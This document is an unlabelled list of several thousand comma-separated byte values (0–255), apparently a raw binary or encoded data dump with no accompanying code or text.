19,32,75,127,130,167,156,210,243,235,5,53,17,41,144,175,194,204,131,66,125,89,122,111,133,184,253,155,230,162,88,35,88,109,139,179,145,178,174,21,56,88,75,127,142,146,154,225,183,71,123,25,67,110,135,174,195,239,249,39,127,16,98,96,136,231,201,234,4,0,50,67,85,211,234,157,209,175,6,7,53,88,118,223,186,218,137,181,86,83,100,4,63,214,221,155,241,168,27,35,54,44,2,158,184,209,180,95,54,96,107,84,98,128,149,148,238,238,55,46,27,66,110,205,179,217,244,10,13,87,53,79,103,140,178,221,178,70,60,68,123,121,154,194,247,148,234,0,62,84,83,77,172,205,162,138,179,65,104,75,122,149,73,194,149,218,235,31,120,75,123,105,140,184,203,223,95,88,109,91,50,131,159,188,173,203,93,9,53,13,59,222,255,240,154,175,168,94,96,89,49,134,182,168,189,175,26,50,89,62,43,139,240,245,209,253,226,16,44,105,46,154,184,223,194,221,10,56,17,85,121,131,176,221,218,184,30,61,88,68,117,255,132,196,215,230,19,58,23,41,36,129,173,193,239,226,48,124,83,48,201,179,207,200,239,238,69,104,22,124,146,182,212,219,237,215,79,32,7,54,220,253,206,254,229,26,37,111,64,98,154,167,218,208,87,113,41,35,94,37,143,182,208,235,224,37,27,106,27,36,135,230,198,241,27,13,81,25,70,110,205,226,156,177,80,105,22,8,55,146,193,187,220,232,97,86,54,51,94,243,239,176,210,167,90,105,72,97,123,113,174,239,140,161,13,46,11,41,62,159,180,223,244,31,13,62,98,49,33,128,165,225,155,92,0,62,69,70,202,199,178,206,189,186,66,90,67,115,129,158,142,150,129,93,123,49,16,122,199,211,248,192,252,239,14,20,76,148,200,191,175,207,227,2,88,53,93,113,197,255,241,247,222,31,38,80,80,99,191,158,211,194,234,30,55,60,30,9,233,246,140,156,170,13,52,75,97,184,177,213,214,195,212,16,61,125,56,145,178,223,200,206,138,109,46,79,98,212,227,153,249,228,235,6,13,87,105,150,161,221,193,25,24,41,54,90,105,199,187,217,248,239,25,84,68,88,33,202,160,199,224,57,73,121,67,8,52,204,162,195,254,14,56,7,64,127,178,141,167,198,254,31,25,122,81,67,155,142,160,162,139,3,59,64,80,127,35,227,155,198,227,27,39,95,113,100,149,185,248,234,25,13,62,90,124,120,149,149,224,201,26,7,32,71,3,5,143,189,216,253,224,65,3,14,107,116,154,174,212,206,57,41,94,114,117,106,190,163,219,199,95,12,34,75,145,139,251,192,161,134,79,120,5,73,33,196,151,181,255,182,89,114,24,77,144,180,175,204,199,222,4,57,80,116,100,166,170,166,201,194,84,60,79,109,159,184,176,204,152,166,94,115,70,114,149,190,203,172,213,19,42,12,75,100,154,169,217,231,209,193,28,46,70,106,145,150,221,253,251,61,124,40,79,106,137,186,189,151,188,25,50,44,74,99,176,230,136,179,86,26,54,78,83,91,159,179,195,233,28,48,63,95,124,178,255,171,208,239,6,20,83,49,68,132,140,170,193,165,88,103,51,92,118,77,187,220,195,249,11,59,27,69,127,157,176,208,221,16,14,35,24,14,103,154,191,208,200,112,110,43,89,75,102,143,237,142,187,225,5,81,79,76,126,176,191,215,250,29,63,124,119,114,109,167,246,221,239,29,48,46,45,240,15,253,198,167,184,76,109,22,109,123,103,177,164,211,250,16,26,82,76,151,183,169,216,194,230,29,13,64,120,73,194,136,168,252,231,31,69,32,36,218,230,234,224,134,176,87,96,19,58,206,228,235,236,226,57,12,45,75,120,148,242,132,193,204,232,8,15,2,54,214,160,223,195,254,54,62,45,68,68,151,176,213,217,239,39,40,46,107,33,141,162,196,226,248,116,84,83,85,107,139,169,133,179,184,16,55,94,118,153,176,131,213,229,238,59,42,94,67,151,173,158,210,237,44,69,37,78,116,110,176,179,164,239,30,29,38,86,59,202,245,209,242,23,3,9,60,104,125,149,183,249,209,28,1,44,58,114,114,129,132,146,246,229,60,83,39,38,2,197,234,142,190,9,43,93,87,118,96,130,189,228,245,18,28,51,67,120,101,157,159,221,224,35,111,89,124,69,110,178,196,162,247,4,33,87,71,60,199,250,197,204,232,33,62,85,121,114,101,139,155,236,226,17,47,94,88,154,152,159,159,197,229,2,62,94,31,247,223,248,254,191,9,50,87,112,123,148,184,180,192,246,247,15,3,85,121,148,189,238,194,241,23,53,46,38,10,215,244,233,151,242,29,50,50,67,114,149,134,212,206,240,28,42,97,81,111,161,238,200,205,244,28,61,59,30,146,174,169,206,207,166,75,119,77,112,151,176,160,196,209,240,1,43,79,100,84,175,209,224,169,231,17,37,64,118,252,217,157,166,74,78,71,125,25,60,203,250,145,146,80,35,44,21,72,106,149,173,159,170,241,49,54,37,104,46,206,233,192,242,21,56,21,74,121,97,139,166,251,248,21,21,96,40,123,96,129,166,162,133,15,61,88,90,67,32,224,237,202,244,26,46,84,81,94,139,188,216,254,247,57,35,91,71,62,147,131,164,242,234,123,64,33,6,6,253,255,218,198,230,106,93,85,122,125,206,247,226,190,118,81,23,23,56,222,201,252,197,200,227,18,100,75,122,149,155,237,141,175,83,121,97,11,38,233,255,183,216,254,81,122,101,1,223,255,225,228,160,159,85,51,90,65,37,200,237,226,139,182,82,112,16,50,214,252,206,192,204,235,16,118,25,62,212,253,232,132,129,161,67,103,13,53,223,250,151,173,170,238,1,32,14,57,213,243,147,181,184,94,70,112,11,40,216,249,156,129,87,95,74,102,46,9,130,164,213,184,162,92,121,105,10,45,210,232,145,188,88,85,117,23,59,33,201,243,142,171,91,124,126,73,20,102,131,172,135,167,73,109,114,26,4,223,252,236,141,176,85,107,115,30,58,216,248,154,190,164,76,118,17,13,61,222,235,203,248,235,21,108,10,9,43,207,245,157,135,162,127,111,16,18,55,205,246,225,189,91,123,29,1,39,46,216,243,144,128,161,68,105,63,2,31,138,162,201,174,82,120,96,10,37,33,209,242,149,186,80,121,100,0,222,254,255,227,137,177,91,118,19,3,36,199,203,225,138,181,81,111,15,49,213,209,239,229,195,234,17,117,17,53,150,168,166,180,201,244,1,7,22,113,152,176,216,174,134,160,70,42,66,113,128,177,220,198,241,85,9,35,75,100,135,248,155,128,181,94,73,101,3,35,197,233,143,183,128,91,120,104,9,44,209,231,144,187,182,84,116,22,58,32,200,242,141,170,90,90,125,98,56,33,204,194,171,232,13,3,37,25,70,153,181,170,254,238,6,28,19,88,127,158,185,242,189,190,87,117,59,95,117,153,192,163,242,164,79,107,104,8,42,206,244,156,134,161,126,110,110,17,54,204,245,224,188,90,122,28,0,5,45,215,242,143,191,160,67,104,62,6,49,231,198,206,233,4,35,86,71,68,97,189,255,157,247,0,49,55,118,142,147,142,236,216,226,50,33,18,15,35,107,133,169,221,253,3,33,126,62,132,139,137,227,134,190,83,32,68,117,150,251,137,160,252,16,13,101,11,51,221,248,244,228,133,168,77,99,12,55,211,241,240,146,182,92,68,110,9,38,214,247,154,158,180,93,72,100,2,34,196,232,142,191,146,20,50,47,92,43,192,230,145,153,253,7,63,84,124,183,201,188,217,193,236,89,56,47,118,32,134,178,237,241,166,14,62,89,2,141,168,130,223,174,244,1,113,28,56,214,246,152,188,162,74,83,110,11,59,220,255,228,186,163,78,73,103,7,41,205,243,155,133,160,125,76,109,16,31,230,253,157,255,16,54,85,95,73,121,190,243,134,250,19,11,47,127,81,99,158,163,236,232,30,63,120,125,80,154,155,179,210,234,15,63,1,48,107,219,224,225,202,250,49,32,17,77,64,103,134,211,136,179,79,109,13,47,50,216,192,234,133,162,82,115,22,59,209,217,196,224,190,94,64,100,10,50,220,214,243,227,132,167,102,79,2,52,134,157,174,225,225,20,12,31,76,108,154,184,185,208,230,52,69,107,69,109,138,175,143,192,237,11,63,0,67,100,134,131,247,202,241,6,49,85,106,159,142,147,133,215,183,69,123,48,100,183,158,230,200,194,230,6,35,23,1,220,249,233,138,140,177,71,112,27,55,213,245,151,187,161,168,82,109,10,58,219,254,227,185,162,172,72,102,6,40,230,223,212,193,23,15,75,62,74,96,137,178,204,251,16,27,119,77,3,111,155,177,141,239,27,24,4,87,116,99,138,170,198,199,79,104,34,102,81,222,136,166,146,183,77,118,97,28,58,218,252,224,134,174,88,115,16,31,0,35,200,158,135,178,78,108,12,13,49,215,213,196,203,229,81,123,28,50,124,138,134,198,252,17,15,55,76,86,32,220,240,177,209,227,18,32,70,69,50,198,171,211,253,12,16,41,116,112,145,179,237,217,255,26,1,106,83,114,139,132,187,218,189,22,60,101,86,41,194,188,236,197,252,23,113,19,55,221,197,239,233,134,182,87,122,31,53,222,201,229,226,130,164,72,110,22,0,219,210,197,166,206,248,18,111,19,52,152,187,217,206,189,175,48,63,96,35,159,187,171,246,203,171,3,43,68,39,142,183,208,205,246,90,12,34,14,51,201,242,157,185,87,86,120,28,2,42,212,239,140,188,93,95,68,26,41,3,195,234,205,236,7,29,16,103,8,153,129,167,217,213,24,38,45,82,95,157,181,214,227,183,5,51,38,93,63,63,199,216,192,248,3,32,106,64,113,149,177,164,131,160,80,113,20,24,46,215,194,158,188,92,126,98,8,15,57,212,241,225,168,136,4,37,65,71,47,157,191,199,179,31,8,107,6,35,50,211,246,155,177,90,69,97,63,223,32,196,234,184,145,94,118,48,87,105,92,150,164,217,192,20,57,93,120,157,137,152,128,135,189,18,53,87,124,190,156,144,179,200,197,3,35,92,89,192,165,135,175,201,175,1,32,88,53,129,178,221,219,190,187,80,59,90,112,217,176,160,213,240,230,70,100,4,38,202,240,152,225,188,89,73,106,13,50,200,241,182,149,231,16,35,88,64,123,146,166,232,181,233,27,26,88,78,93,133,166,196,230,192,82,62,42,126,220,158,168,201,244,7,35,50,91,123,151,150,158,153,172,4,17,37,94,62,109,135,223,202,252,76,73,105,11,47,213,253,231,130,95,79,112,114,23,45,214,235,176,178,83,51,46,47,90,123,157,165,166,137,232,5,94,36,66,46,204,236,142,178,88,64,106,5,1,49,210,223,183,254,28,12,52,62,121,154,143,171,208,245,51,50,49,81,103,110,135,163,219,218,79,41,88,53,219,34,204,231,132,180,85,82,48,124,152,38,135,181,210,246,70,41,88,119,145,130,197,230,137,174,110,64,17,60,156,189,186,195,254,235,26,44,15,121,143,186,175,198,176,226,22,34,87,15,228,197,219,233,255,22,13,67,33,103,199,237,155,211,243,26,55,104,65,122,135,140,207,223,243,19,41,24,1,44,200,204,171,142,253,89,55,44,119,143,136,162,218,242,169,94,127,74,115,130,173,206,131,169,180,67,124,9,61,44,208,155,136,190,170,68,125,27,46,216,254,163,198,16,15,60,113,87,126,128,161,156,255,28,53,49,14,15,63,128,170,219,201,239,59,103,37,84,94,159,170,207,252,24,60,67,78,42,29,216,176,215,234,114,110,91,82,121,222,194,232,144,144,120,123,96,49,86,111,131,170,193,227,76,110,28,39,57,45,201,181,199,230,0,36,28,48,58,43,207,159,250,230,11,42,97,124,101,129,165,160,206,228,13,7,23,61,223,208,240,150,166,225,9,39,71,68,215,216,187,194,244,252,7,3,0,36,196,207,180,205,239,54,71,45,77,121,136,132,251,157,234,21,60,77,112,73,203,174,161,244,185,92,65,23,0,43,199,229,206,171,228,21,48,54,61,159,158,170,218,193,168,23,53,24,54,214,248,182,175,204,231,15,63,72,60,194,196,222,198,193,235,6,41,108,108,129,174,132,197,27,229,3,27,21,43,212,255,177,148,80,31,42,37,88,101,217,160,209,246,246,229,50,48,86,44,198,175,223,252,23,56,71,110,61,110,130,166,249,174,18,4,52,85,80,223,201,162,195,254,19,62,52,123,71,108,140,188,210,237,0,34,76,56,21,10,231,240,147,178,78,118,94,87,119,101,178,223,236,245,37,47,84,82,120,184,195,168,198,239,13,39,60,31,106,156,189,212,253,163,80,104,65,112,121,154,188,221,217,230,17,52,96,102,96,133,186,245,185,26,7,36,69,99,239,224,210,185,152,127,125,92,112,99,250,231,163,217,253,91,64,22,63,0,235,135,173,192,169,79,119,97,60,217,201,234,198,188,174,69,117,7,61,129,190,218,183,134,249,30,43,78,59,222,195,153,225,140,168,70,102,8,44,210,208,201,250,232,231,9,111,20,42,211,254,154,184,183,115,80,106,26,61,132,164,220,233,142,238,40,37,91,43,201,233,139,175,85,92,70,97,62,46,207,216,186,164,26,236,53,113,117,136,149,135,193,252,91,3,51,33,64,120,254,231,146,174,76,108,109,17,55,223,201,228,171,156,28,48,49,91,56,103,186,209,255,30,13,12,60,86,84,158,142,170,237,228,21,63,116,16,104,135,240,148,186,162,76,103,4,19,30,250,179,214,187,227,23,50,84,1,96,135,186,213,239,85,69,102,9,4,14,197,255,221,254,24,39,84,115,112,104,193,168,193,246,10,44,27,117,122,101,150,200,169,130,99,127,36,117,157,226,229,175,222,227,79,122,22,52,254,219,240,157,212,226,9,42,90,111,142,192,247,236,152,167,73,103,6,111,148,173,177,220,238,249,75,62,92,102,158,253,213,218,215,88,48,46,67,95,207,163,200,201,222,166,122,111,12,102,132,161,225,174,252,15,16,1,63,37,151,183,223,248,251,49,97,91,112,183,255,229,141,183,177,78,126,31,40,10,179,163,217,249,75,15,56,81,98,141,200,165,201,176,81,83,120,36,26,103,170,221,232,13,66,90,111,93,113,157,131,163,203,207,12,37,18,67,97,132,132,220,237,244,42,102,98,18,51,252,214,152,255,241,0,75,77,8,106,133,187,200,244,26,17,35,8,0,103,152,186,211,246,80,126,20,53,83,98,135,137,157,182,21,50,117,61,75,111,136,138,131,232,25,32,126,56,223,99,139,173,200,234,58,99,86,118,160,128,185,220,203,255,8,66,53,124,143,108,183,217,138,187,68,32,67,102,146,185,143,249,245,229,43,33,94,97,186,179,163,192,212,87,55,32,74,124,130,193,215,177,147,170,61,44,72,3,234,163,199,201,178,90,68,31,22,1,196,188,217,195,216,17,46,77,89,149,186,236,194,194,241,29,46,16,74,117,189,177,144,172,169,73,107,15,53,221,237,207,241,234,231,6,119,73,115,109,191,218,245,56,228,8,39,90,106,149,171,173,200,224,20,20,59,14,104,130,175,146,253,246,3,16,34,80,50,147,179,144,185,164,64,87,48,54,102,159,184,207,245,18,75,42,41,66,117,137,187,196,233,79,125,23,94,78,99,175,230,148,185,90,54,17,19,66,108,137,162,219,227,39,48,90,88,47,96,138,174,201,235,57,33,81,89,125,159,190,214,175,130,67,35,89,125,16,242,176,202,200,241,16,99,24,41,139,147,140,217,249,230,44,40,95,110,146,131,179,255,248,26,51,11,91,123,205,201,249,154,151,143,113,36,88,105,146,181,239,197,254,16,23,93,117,126,138,239,255,204,225,17,56,81,55,213,255,234,179,209,228,24,51,117,8,37,183,168,238,138,228,4,35,101,54,212,131,173,249,202,225,37,108,79,112,83,168,219,248,246,16,6,109,10,50,138,179,167,196,231,41,31,52,102,103,135,164,218,183,19,233,0,47,92,27,249,188,220,244,226,24,124,1,62,102,141,188,216,244,28,39,6,43,67,98,144,177,251,226,2,57,24,74,72,43,138,162,208,251,27,86,92,48,40,40,187,209,196,143,102,122,81,91,125,79,138,188,216,194,3,51,27,94,103,147,166,207,138,229,26,39,66,22,57,222,244,183,165,173,74,44,75,97,121,150,177,207,241,167,68,105,25,104,97,141,161,198,209,93,121,83,75,80,43,132,180,208,215,163,127,46,68,115,145,145,132,144,243,29,49,73,123,104,134,130,177,162,156,118,85,82,120,157,214,236,224,145,253,24,62,95,124,113,169,225,237,133,180,71,101,15,50,158,145,165,208,220,224,31,22,11,122,144,178,205,217,249,23,0,45,68,84,204,254,147,128,202,16,12,27,12,101,158,185,241,180,181,254,4,86,91,127,189,226,204,254,237,93,123,27,61,11,234,170,202,248,16,230,65,121,9,154,158,186,219,238,44,2,62,81,107,101,145,183,243,252,18,90,112,25,4,10,211,219,211,232,11,52,123,11,51,100,138,174,193,239,10,38,34,15,47,209,245,177,174,173,72,101,116,63,21,153,189,217,135,163,65,97,41,43,61,212,245,153,229,242,23,39,74,80,121,153,244,143,178,7,44,78,75,74,126,147,182,152,187,160,118,31,10,38,35,233,200,128,186,71,79,12,49,125,96,141,166,137,251,8,54,65,53,215,218,192,232,146,173,74,80,54,62,35,249,193,236,136,166,70,66,33,59,158,138,187,155,207,226,10,116,3,59,155,174,182,193,240,9,0,10,15,117,139,180,208,171,133,21,1,39,95,41,140,173,198,218,247,166,7,87,14,38,218,185,194,220,212,31,52,79,122,40,138,162,217,240,255,95,64,99,8,222,199,242,142,134,134,68,53,89,122,41,205,233,218,241,253,21,44,9,70,140,168,210,242,163,64,88,52,90,123,118,128,168,222,231,66,24,60,79,109,128,244,154,130,172,71,67,115,20,29,241,242,155,134,162,64,96,97,5,1,254,185,214,240,165,70,105,109,3,44,215,243,187,156,24,54,88,54,76,41,198,246,151,186,95,117,30,9,4,34,194,206,165,224,19,8,79,56,66,126,130,188,231,234,20,57,77,122,116,217,171,168,223,172,15,48,26,61,34,215,192,235,135,165,111,74,11,49,217,34,253,154,138,171,100,94,77,124,152,216,246,150,184,92,66,106,20,5,225,184,178,218,132,90,67,110,10,40,200,234,237,147,187,165,106,48,4,106,159,179,235,148,191,91,121,25,59,223,197,237,151,145,174,94,127,98,45,240,207,225,141,134,186,76,124,6,54,127,134,174,158,131,225,23,58,84,71,168,252,129,190,251,243,6,58,91,125,100,180,235,218,242,192,7,111,13,45,207,243,153,129,171,165,66,114,19,54,219,241,154,133,161,127,126,74,41,76,177,187,217,253,246,7,71,113,2,110,155,179,194,214,49,120,43,49,101,124,197,245,150,185,94,116,29,103,3,33,193,227,135,173,85,127,26,22,6,39,224,194,140,166,23,58,90,70,119,150,171,160,152,231,4,57,90,108,0,214,255,234,134,164,68,102,10,48,55,33,252,153,137,170,103,95,77,100,105,131,245,136,183,30,23,32,95,79,142,148,180,199,205,24,66,109,9,39,199,200,236,146,186,164,127,28,12,45,208,212,192,190,240,31,48,76,58,206,196,242,245,216,249,17,63,36,110,210,136,165,131,221,169,15,33,84,61,106,151,247,186,143,246,25,44,22,81,143,147,207,189,198,239,78,120,19,48,32,193,228,137,190,167,82,110,38,1,206,242,152,128,137,164,65,113,18,53,218,240,179,169,169,95,57,86,76,103,144,182,195,219,161,171,2,39,72,98,182,165,220,253,24,50,62,44,69,65,222,166,212,240,62,39,123,34,76,97,192,176,199,228,55,42,120,8,5,107,156,134,208,173,20,53,50,94,127,215,253,229,143,170,71,119,24,26,63,213,254,195,168,170,65,49,91,79,70,116,180,215,250,237,5,62,73,78,119,131,156,150,190,30,12,33,90,78,125,138,168,212,228,28,15,37,110,60,119,134,163,242,237,163,58,85,74,44,124,146,161,241,233,89,106,23,105,143,171,158,244,195,237,31,50,44,5,219,196,206,234,136,168,74,110,20,60,38,235,208,191,203,229,21,45,71,65,148,153,148,207,250,226,31,54,70,47,194,192,177,166,245,197,5,109,71,106,142,190,219,158,136,163,64,112,17,52,217,239,152,131,190,118,81,81,70,40,217,169,193,247,198,240,4,62,8,122,134,185,207,254,230,83,55,40,11,114,134,180,198,246,8,81,118,26,1,141,176,167,133,171,83,92,119,20,4,37,226,192,198,255,27,19,54,16,47,214,185,178,199,229,39,51,56,86,103,154,188,232,200,227,1,43,43,13,53,223,250,151,135,168,75,90,72,14,57,213,243,147,181,89,127,77,60,2,108,150,188,156,129,87,64,107,7,4,36,236,199,153,177,216,115,73,69,122,106,156,161,195,254,88,122,111,54,146,110,128,167,199,248,20,12,17,84,136,106,205,229,255,169,26,34,99,124,107,150,174,174,133,231,16,37,26,44,137,182,172,217,251,210,76,122,95,97,151,171,136,181,243,213,94,60,88,98,196,164,148,214,200,237,51,97,85,126,153,188,241,130,189,70,123,88,76,102,157,159,247,158,208,243,12,105,63,40,211,239,141,140,174,82,120,96,10,15,239,251,155,248,245,25,45,39,78,139,184,232,200,230,240,24,38,19,3,36,199,236,130,171,181,123,66,15,49,213,251,227,141,168,69,126,88,17,115,156,181,179,202,242,14,50,104,92,102,150,249,154,213,232,58,9,42,68,106,150,250,198,213,19,49,41,35,4,98,154,185,201,230,53,127,119,101,101,64,130,167,198,229,227,124,85,41,74,99,157,231,144,187,87,117,21,55,58,10,229,242,132,178,84,106,30,9,56,115,133,140,205,233,7,32,26,58,8,222,181,164,197,251,29,57,92,78,212,135,165,209,189,190,75,38,95,93,154,147,137,183,249,164,3,42,74,102,135,206,244,156,134,161,126,110,15,24,250,168,179,169,242,17,122,89,72,114,206,190,189,143,235,238,12,58,120,39,156,167,235,210,225,5,52,90,91,109,133,241,193,208,236,27,43,99,39,211,236,159,208,218,245,3,52,94,82,35,129,165,200,219,214,80,99,3,48,212,250,226,140,167,163,83,94,58,60,210,251,230,130,160,95,65,79,38,103,148,182,224,139,175,210,67,49,69,83,152,190,222,255,87,113,84,110,5,94,216,165,211,219,30,49,7,40,10,117,129,166,128,165,242,52,35,36,77,93,208,251,143,232,31,16,95,90,118,147,199,241,140,169,89,122,29,97,29,13,153,168,209,230,2,29,90,87,77,177,244,175,198,239,1,15,113,51,117,151,181,152,161,162,24,61,107,103,116,147,179,228,246,226,13,37,68,40,41,205,243,155,133,160,125,71,35,112,132,142,185,222,216,13,55,94,109,119,152,181,255,203,253,30,18,52,118,116,158,155,234,151,172,29,55,93,8,111,129,179,191,223,184,78,119,98,62,220,252,158,203,170,175,89,116,17,1,34,197,234,181,165,186,71,40,75,102,157,146,177,194,208,243,55,54,85,105,158,188,229,129,190,94,64,100,10,50,246,218,148,132,132,167,76,98,11,54,248,221,212,252,19,91,8,44,77,119,151,246,215,251,28,8,71,55,79,100,145,166,253,187,15,11,62,102,83,101,129,229,220,246,85,35,32,92,56,138,137,190,139,250,23,121,41,33,126,156,202,178,203,234,70,44,38,23,1,220,249,233,138,173,82,66,60,84,115,213,166,195,235,236,12,39,90,107,98,154,179,227,165,162,30,61,87,75,109,152,166,219,132,27,50,45,13,117,98,131,167,221,219,20,52,83,85,107,127,128,145,194,249,94,4,42,117,109,120,203,233,137,171,101,88,29,7,34,255,228,194,130,183,80,118,50,105,139,182,185,180,210,239,88,63,81,67,110,136,200,158,135,178,100,65,12,62,199,248,253,233,215,245,1,63,80,110,132,152,188,222,240,93,51,34,74,126,151,246,147,226,131,140,102,75,39,60,211,168,193,248,250,8,3,59,5,36,216,230,152,177,176,85,21,48,69,121,131,170,220,180,191,88,123,107,6,122,154,161,202,234,21,5,114,19,57,211,197,237,138,224,25,30,46,94,118,151,141,164,209,198,69,73,41,88,73,143,170,169,221,223,83,103,99,24,122,152,189,253,186,239,28,39,13,11,49,131,187,171,236,238,34,114,39,76,75,203,241,153,131,116,86,46,89,92,103,201,239,157,252,1,62,77,126,99,102,152,166,231,243,9,21,4,116,71,46,202,232,136,128,99,94,49,66,111,152,205,238,145,182,102,88,46,110,143,141,190,205,133,173,87,114,15,63,32,34,237,176,143,162,77,103,9,44,149,185,171,167,197,160,3,37,81,126,157,185,150,158,243,50,124,98,4,50,150,185,184,138,130,234,30,53,104,54,216,183,200,198,231,22,47,113,68,106,191,244,151,155,177,90,69,97,63,245,236,171,206,218,232,87,100,100,24,53,205,176,216,242,245,2,49,70,53,220,130,167,137,166,181,86,83,51,61,213,155,182,199,251,226,11,29,80,105,147,187,134,220,238,23,69,115,25,102,135,182,210,235,30,19,80,39,73,123,150,176,225,183,160,75,108,73,46,11,142,190,221,130,93,122,106,64,32,97,154,189,204,184,24,36,77,79,68,123,211,238,139,187,92,127,100,25,40,0,141,169,194,169,77,115,27,5,63,220,204,199,189,241,5,49,31,59,56,216,250,158,132,172,86,113,14,62,20,12,130,210,192,176,76,106,10,44,208,213,253,231,130,95,79,112,19,56,206,252,236,217,245,30,125,97,7,47,217,211,240,224,129,164,73,31,8,51,207,237,236,142,178,88,106,71,12,114,210,255,166,200,252,9,76,52,108,155,147,170,160,159,254,26,49,34,80,39,204,226,139,149,177,79,111,17,53,219,195,237,136,132,180,85,120,29,51,220,199,227,129,170,143,8,41,92,106,217,230,246,146,170,179,88,109,76,103,155,182,148,234,17,165,27,35,74,126,180,190,178,249,17,238,12,99,69,108,201,239,151,129,92,121,72,105,12,49,199,240,155,183,85,117,118,26,0,40,248,192,207,254,14,42,11,86,70,109,165,232,143,230,3,59,78,42,109,148,187,226,223,230,34,54,30,20,55,153,182,212,215,226,6,63,125,18,109,114,141,147,132,178,75,61,90,98,106,212,176,167,194,17,2,111,18,55,44,213,192,156,186,90,124,96,6,46,55,210,239,159,128,163,72,52,42,124,139,131,191,141,244,26,62,7,10,115,148,136,181,213,223,20,2,92,114,177,255,223,182,144,255,24,51,12,13,118,203,165,167,213,176,94,110,14,52,146,150,160,167,198,219,90,58,73,90,158,198,166,209,254,161,21,57,123,120,216,177,171,199,136,224,22,4,82,51,151,184,147,183,188,164,78,105,6,54,215,250,159,181,189,168,68,98,40,9,193,236,194,210,26,39,19,39,68,66,130,166,213,248,21,30,32,113,61,47,149,160,192,241,57,8,18,69,73,77,131,171,204,193,81,35,61,54,126,155,152,170,198,208,71,34,124,5,54,134,170,244,199,170,24,46,40,84,112,223,196,154,131,174,74,104,8,9,45,211,251,229,128,93,77,68,60,28,41,144,182,212,247,24,54,74,109,14,62,149,162,215,247,193,19,78,84,120,74,142,164,197,214,76,44,45,87,99,110,130,178,208,205,89,18,30,33,220,144,148,143,202,185,24,48,34,77,105,202,255,232,147,175,77,109,15,51,217,193,202,229,130,178,83,92,54,127,159,141,148,158,236,229,16,41,83,110,150,188,135,234,215,172,6,37,87,50,130,181,203,212,247,211,1,41,70,122,186,249,131,205,188,247,67,39,72,35,199,237,149,191,185,86,70,103,10,47,197,196,180,250,246,82,125,17,54,117,130,174,209,249,244,43,20,83,88,48,207,230,215,244,15,22,54,45,76,219,193,175,206,251,30,2,62,100,97,144,144,129,196,228,18,10,98,73,105,151,130,201,203,173,7,46,102,88,44,222,133,228,237,19,10,109,111,20,42,211,254,154,184,114,87,67,56,11,40,208,190,207,242,241,70,80,68,76,100,133,233,139,175,85,125,103,2,62,4,226,251,159,254,4,4,68,122,118,172,133,176,199,244,50,36,37,70,36,102,177,174,198,237,2,57,72,50,148,158,138,171,205,177,82,117,26,26,244,9,210,216,232,13,23,105,12,59,145,189,139,174,203,234,17,57,21,125,142,172,191,216,186,162,76,103,46,25,213,248,252,146,145,139,75,113,14,50,206,184,221,220,239,91,14,53,72,122,196,237,152,147,155,124,115,23,61,37,229,199,142,158,242,28,54,91,85,121,140,182,210,192,237,13,36,47,125,216,200,233,140,155,139,79,122,22,52,254,219,222,206,237,177,76,105,25,16,240,134,214,196,172,72,69,101,7,43,209,249,201,147,82,15,5,43,19,106,210,224,153,227,25,60,46,35,122,58,132,236,149,181,238,10,82,55,77,100,157,174,130,226,24,61,37,48,61,45,206,241,150,172,85,64,28,25,57,219,213,200,201,249,23,111,22,68,76,98,253,239,218,165,7,36,66,69,102,151,157,178,229,170,28,33,81,47,62,42,176,211,245,10,1,38,69,124,221,157,141,163,198,250,64,39,81,120,154,205,162,198,241,161,13,47,3,51,212,214,251,145,186,165,65,31,63,33,239,198,188,217,255,0,68,46,8,107,138,236,246,146,176,80,114,22,60,14,227,233,229,149,182,89,126,20,61,2,233,235,198,205,226,77,117,31,58,215,199,232,139,165,136,10,55,80,51,211,245,153,191,134,176,75,104,24,57,220,235,186,196,229,227,68,109,31,62,216,189,177,252,31,229,15,63,75,109,154,252,214,243,30,3,123,99,71,124,135,191,216,242,10,2,123,98,16,52,199,238,204,254,18,62,8,90,110,117,136,187,157,238,4,38,46,24,126,147,254,228,140,182,81,110,30,30,1,38,252,229,144,172,74,106,38,34,60,207,215,236,175,167,4,58,89,90,56,106,174,218,239,93,65,103,15,57,51,208,192,225,132,169,127,104,19,47,44,230,195,155,253,230,3,43,105,50,96,154,188,144,190,181,71,30,103,101,175,193,241,130,162,83,94,100,22,83,169,188,245,156,162,79,120,12,47,43,158,148,161,198,229,1,56,88,60,39,195,225,224,130,166,76,116,30,57,214,198,231,233,142,142,96,54,81,122,134,244,154,211,202,230,30,36,89,109,157,194,150,162,148,165,74,48,86,108,157,167,184,249,243,160,12,60,72,115,208,189,222,181,180,86,122,96,8,50,205,234,154,187,94,136,85,104,4,102,137,175,220,239,28,12,5,22,119,103,141,172,196,170,83,93,121,23,55,217,253,201,166,181,80,109,124,29,0,37,251,206,162,162,64,107,38,65,123,168,196,233,237,253,14,62,21,74,90,100,176,211,242,63,20,53,92,94,84,139,177,169,229,178,46,37,18,73,101,138,237,193,245,87,73,54,78,16,56,221,251,202,254,234,49,118,63,215,102,132,185,210,214,6,17,49,79,77,100,135,189,246,180,30,50,20,126,108,106,198,179,209,188,87,46,93,59,47,203,253,218,199,236,5,24,31,48,145,137,140,160,238,247,31,37,90,87,149,189,191,250,158,237,73,34,88,118,218,188,157,157,149,164,9,98,72,105,141,185,172,154,183,167,72,107,16,38,207,208,187,154,177,30,58,94,87,122,143,168,251,184,180,229,59,41,67,68,145,182,213,226,214,28,12,84,92,48,153,171,202,232,253,44,52,87,117,151,144,226,151,180,31,9,123,80,126,103,181,175,142,170,72,71,105,13,51,219,239,205,180,175,10,25,58,69,117,146,174,241,187,83,44,54,45,90,82,136,145,219,206,238,53,5,36,95,120,131,138,212,248,23,46,121,92,15,116,157,185,142,244,162,99,28,113,104,105,199,163,216,247,30,13,98,5,9,223,200,243,143,173,103,66,65,124,84,105,132,176,211,251,53,117,67,127,124,97,178,238,204,229,9,61,112,55,201,35,135,231,192,227,8,57,94,48,208,209,245,155,131,173,72,79,56,63,209,187,181,213,201,200,17,40,86,118,168,176,189,203,249,224,71,36,64,108,154,186,186,199,244,84,52,95,69,127,135,232,152,152,187,138,91,31,10,38,196,206,171,163,130,19,15,89,57,41,202,237,184,170,254,9,34,65,112,133,251,225,137,179,173,74,122,27,20,14,188,177,193,232,224,70,117,12,119,140,141,203,255,205,224,3,61,97,124,138,175,249,247,30,126,67,107,21,48,205,253,158,171,139,117,70,61,68,123,155,174,141,181,81,84,65,18,12,46,219,179,195,227,238,59,27,78,115,110,198,171,222,250,30,43,105,99,90,155,149,183,202,254,25,3,18,82,119,125,196,164,211,178,1,41,69,116,3,138,178,228,189,163,69,115,87,122,123,73,195,169,223,244,43,119,25,118,104,153,160,213,236,182,5,45,120,53,216,220,242,155,134,162,64,74,47,104,137,155,169,152,240,227,15,39,69,36,153,152,189,